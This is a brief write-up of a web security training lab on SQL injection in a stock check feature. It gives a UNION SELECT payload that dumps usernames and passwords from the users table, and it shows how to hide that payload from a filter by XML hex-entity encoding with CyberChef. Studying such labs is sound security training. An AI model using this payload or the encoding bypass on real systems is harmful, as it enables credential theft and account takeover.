# Lab: SQL injection with filter bypass via XML encoding

PRACTITIONER

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.


```r
#https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(true,'Hex%20entities')&input=MSB1bmlvbiBzZWxlY3QgdXNlcm5hbWUgfHwnOid8fHBhc3N3b3JkIGZyb20gdXNlcnM

1 union select username ||':'||password from users
```


![[class17.png]]